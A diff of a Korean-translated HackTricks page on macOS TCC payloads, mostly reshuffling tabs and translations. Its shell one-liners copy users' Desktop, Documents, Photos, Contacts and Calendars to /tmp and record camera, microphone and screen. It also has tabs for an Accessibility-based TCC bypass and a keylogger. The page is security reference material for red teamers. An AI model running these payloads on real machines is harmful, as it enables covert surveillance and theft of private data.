@@ -1,28 +1,28 @@
 # macOS TCC Payloads
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
-* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-### 데스크탑
+### Desktop
 
-* **권한**: 없음
+* **Entitlement**: 없음
 * **TCC**: kTCCServiceSystemPolicyDesktopFolder
 
 {% tabs %}
-{% tab title="Objective-C" %}
-`$HOME/Desktop`을 `/tmp/desktop`로 복사합니다.
-
+{% tab title="ObjetiveC" %}
+`$HOME/Desktop`를 `/tmp/desktop`으로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -56,9 +56,8 @@ fclose(stderr); // Close the file stream
 ```
 {% endtab %}
 
-{% tab title="쉘" %}
-`$HOME/Desktop`을 `/tmp/desktop`로 복사합니다.
-
+{% tab title="Shell" %}
+`$HOME/Desktop`를 `/tmp/desktop`으로 복사합니다.
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
@@ -71,11 +70,8 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 * **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC" %}
 `$HOME/Documents`를 `/tmp/documents`로 복사합니다.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -111,7 +107,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 `$HOME/`Documents를 `/tmp/documents`로 복사합니다.
-
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -124,11 +119,8 @@ cp -r "$HOME/Documents" "/tmp/documents"
 * **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC" %}
 `$HOME/Downloads`를 `/tmp/downloads`로 복사합니다.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -163,8 +155,7 @@ fclose(stderr); // Close the file stream
 {% endtab %}
 
 {% tab title="Shell" %}
-`$HOME/Downloads`를 `/tmp/downloads`로 복사합니다.
-
+`$HOME/Dowloads`를 `/tmp/downloads`로 복사합니다.
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
@@ -173,15 +164,12 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 
 ### 사진 라이브러리
 
-* **Entitlement**: `com.apple.security.personal-information.photos-library`
+* **권한**: `com.apple.security.personal-information.photos-library`
 * **TCC**: `kTCCServicePhotos`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC" %}
 `$HOME/Pictures/Photos Library.photoslibrary`를 `/tmp/photos`로 복사합니다.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -217,7 +205,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 `$HOME/Pictures/Photos Library.photoslibrary`를 `/tmp/photos`로 복사합니다.
-
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
@@ -226,13 +213,12 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 
 ### 연락처
 
-* **Entitlement**: `com.apple.security.personal-information.addressbook`
+* **권한**: `com.apple.security.personal-information.addressbook`
 * **TCC**: `kTCCServiceAddressBook`
 
 {% tabs %}
 {% tab title="ObjetiveC" %}
-`$HOME/Library/Application Support/AddressBook`을 `/tmp/contacts`로 복사합니다.
-
+`$HOME/Library/Application Support/AddressBook`를 `/tmp/contacts`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -266,9 +252,8 @@ fclose(stderr); // Close the file stream
 ```
 {% endtab %}
 
-{% tab title="쉘" %}
+{% tab title="Shell" %}
 `$HOME/Library/Application Support/AddressBook`를 `/tmp/contacts`로 복사합니다.
-
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
@@ -283,7 +268,6 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 {% tabs %}
 {% tab title="ObjectiveC" %}
 `$HOME/Library/Calendars`를 `/tmp/calendars`로 복사합니다.
-
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -317,15 +301,22 @@ fclose(stderr); // Close the file stream
 ```
 {% endtab %}
 
-{% tab title="쉘" %}
+{% tab title="Shell" %}
 `$HOME/Library/Calendars`를 `/tmp/calendars`로 복사합니다.
-
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
+{% endtab %}
+{% endtabs %}
 
-3초 동영상을 녹화하고 \*\*`/tmp/recording.mov`\*\*에 저장합니다.
+### 카메라
 
+* **권한**: `com.apple.security.device.camera`
+* **TCC**: `kTCCServiceCamera`
+
+{% tabs %}
+{% tab title="ObjetiveC - 녹화" %}
+3초 비디오를 녹화하고 **`/tmp/recording.mov`**에 저장합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -401,11 +392,10 @@ VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
 
-카메라에 대한 프로그램의 접근 권한을 확인합니다.
-
-Check if the program has access to the camera.
-
+{% tab title="ObjectiveC - Check" %}
+프로그램이 카메라에 접근할 수 있는지 확인합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -435,9 +425,10 @@ freopen("/tmp/logs.txt", "a", stderr);
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
 
-카메라로 사진을 찍습니다.
-
+{% tab title="Shell" %}
+카메라로 사진 찍기
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
@@ -450,9 +441,8 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 * **TCC**: `kTCCServiceMicrophone`
 
 {% tabs %}
-{% tab title="ObjectiveC - 녹음" %}
+{% tab title="ObjetiveC - 녹음" %}
 5초 동안 오디오를 녹음하고 `/tmp/recording.m4a`에 저장합니다.
-
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -553,9 +543,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="ObjectiveC - 확인" %}
 앱이 마이크에 접근할 수 있는지 확인합니다.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -586,8 +573,7 @@ static void telegram(int argc, const char **argv) {
 {% endtab %}
 
 {% tab title="Shell" %}
-5초 동안 오디오를 녹음하고 `/tmp/recording.wav`에 저장합니다.
-
+5초 오디오를 녹음하고 `/tmp/recording.wav`에 저장합니다.
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -600,16 +586,15 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 ### 위치
 
 {% hint style="success" %}
-앱이 위치 정보를 얻으려면, **위치 서비스**(개인 정보 및 보안에서)가 **활성화되어 있어야** 합니다. 그렇지 않으면 앱은 위치 정보에 접근할 수 없습니다.
+앱이 위치를 얻으려면 **위치 서비스**(개인정보 보호 및 보안에서) **가 활성화되어야 하며,** 그렇지 않으면 접근할 수 없습니다.
 {% endhint %}
 
-* **Entitlement**: `com.apple.security.personal-information.location`
-* **TCC**: `/var/db/locationd/clients.plist`에서 허용됨
+* **권한**: `com.apple.security.personal-information.location`
+* **TCC**: `/var/db/locationd/clients.plist`에서 부여됨
 
 {% tabs %}
 {% tab title="ObjectiveC" %}
-`/tmp/logs.txt`에 위치 정보를 기록하세요.
-
+위치를 `/tmp/logs.txt`에 기록합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -658,23 +643,22 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 ```
 {% endtab %}
 
-{% tab title="쉘" %}
-위치에 액세스하기
-{% endtab %}
-
-{% tab title="undefined" %}
+{% tab title="Shell" %}
+위치에 접근하기
 ```
 ???
 ```
 {% endtab %}
+{% endtabs %}
 
-{% tab title="undefined" %}
+### 화면 녹화
+
+* **권한**: 없음
+* **TCC**: `kTCCServiceScreenCapture`
+
 {% tabs %}
-{% tab title="undefined" %}
-주요 화면을 5초 동안 `/tmp/screen.mov`에 녹화합니다.
-{% endtab %}
-
-{% tab title="undefined" %}
+{% tab title="ObjectiveC" %}
+메인 화면을 5초 동안 `/tmp/screen.mov`에 녹화합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -731,29 +715,22 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {% endtab %}
 
 {% tab title="Shell" %}
-주요 화면을 5초 동안 녹화합니다.
-
+주 화면을 5초 동안 녹화합니다.
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {% endtab %}
 {% endtabs %}
-{% endtab %}
 
-{% tab title="undefined" %}
-#### 접근성
-{% endtab %}
+### 접근성
 
-{% tab title="undefined" %}
 * **권한**: 없음
 * **TCC**: `kTCCServiceAccessibility`
-{% endtab %}
 
-{% tab title="undefined" %}
-TCC 권한을 사용하여 Finder의 엔터 키를 눌러 제어를 받고, 이를 통해 TCC를 우회합니다.
-{% endtab %}
+TCC 권한을 사용하여 Finder의 제어를 수락하고 그 방법으로 TCC를 우회합니다.
 
-{% tab title="undefined" %}
+{% tabs %}
+{% tab title="TCC 수락" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -806,9 +783,8 @@ return 0;
 ```
 {% endtab %}
 
-{% tab title="Keylogger" %}
-눌린 키를 \*\*`/tmp/keystrokes.txt`\*\*에 저장합니다.
-
+{% tab title="키로거" %}
+누른 키를 **`/tmp/keystrokes.txt`**에 저장합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -916,19 +892,20 @@ return 0;
 {% endtabs %}
 
 {% hint style="danger" %}
-**접근성은 매우 강력한 권한**입니다. 예를 들어, 시스템 이벤트를 호출할 필요 없이 접근성을 통해 **키스트로크 공격**을 수행할 수도 있습니다.
+**접근성은 매우 강력한 권한입니다**, 이를 다른 방식으로 악용할 수 있습니다. 예를 들어, System Events를 호출할 필요 없이 **키스트로크 공격**을 수행할 수 있습니다.
 {% endhint %}
+
+{% hint style="success" %}
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
+<summary>HackTricks 지원하기</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
-* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
+{% endhint %}
